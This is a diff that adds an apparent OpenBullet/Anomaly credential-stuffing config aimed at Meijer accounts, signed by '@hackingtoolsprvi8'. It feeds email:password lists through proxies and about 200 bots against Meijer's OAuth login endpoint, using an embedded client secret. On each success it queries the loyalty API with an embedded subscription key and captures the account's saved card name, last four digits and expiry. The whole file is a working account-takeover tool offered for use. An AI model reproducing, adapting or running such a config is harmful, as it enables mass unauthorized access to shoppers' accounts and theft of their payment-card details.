@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Meijer(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-02T00:48:48.930583+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#clear FUNCTION ClearCookies 
+
+#login REQUEST POST "https://login.meijer.com/as/token.oauth2" 
+  CONTENT "grant_type=password&password=<PASS>&scope=openid&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "Authorization: Basic bW1hOmRyQXFhczc2UmU3UmVrZUJhbmFNYU5FTWFoN3BhREU1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 87" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: login.meijer.com" 
+  HEADER "Meijer-Version: iPhone/8.13.0" 
+  HEADER "User-Agent: Meijer/8.13.0 (iPhone; iOS 15.3.1; Scale/3.00)" 
+
+#login_check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant" 
+    KEY "invalid_request" 
+    KEY "Request Rejected" 
+    KEY "The requested URL was rejected. Please consult with your administrator." 
+    KEY "Your support I" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#token PARSE "<SOURCE>" JSON "access_token" -> VAR "tok" 
+
+#cards REQUEST GET "https://api.meijer.com/loyalty/accounts/cards/account/accountID" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: Bearer <tok>" 
+  HEADER "Build: 708" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: ROUTE=.api-656bd4df68-pm582" 
+  HEADER "Host: api.meijer.com" 
+  HEADER "Ocp-Apim-Subscription-Key: 58763460fcb547f99a1c82e5daa4cbf6" 
+  HEADER "Platform: iOS" 
+  HEADER "User-Agent: Meijer/708 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Version: 8.13.0" 
+  HEADER "x-meijer-external-shopper-id: 9A51DAB8-0FDD-4D00-8191-0633611D08D7" 
+  HEADER "x-mma-session: T9JSP" 
+
+#card_check KEYCHECK 
+  KEYCHAIN Custom "NO CC" OR 
+    KEY "<SOURCE>" DoesNotContain "cardName" 
+  KEYCHAIN Success OR 
+    KEY "cardName" 
+
+#last4 PARSE "<SOURCE>" JSON "cardLastFour" -> VAR "4" 
+
+#Cname PARSE "<SOURCE>" JSON "cardTypeName" -> VAR "cn" 
+
+#EXP PARSE "<SOURCE>" JSON "cardExpirationDate" -> VAR "ex" 
+
+#capture FUNCTION Constant "Last4-[<4>] CardName-[<cn>] Expiry-[<ex>]" -> CAP "Capture" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
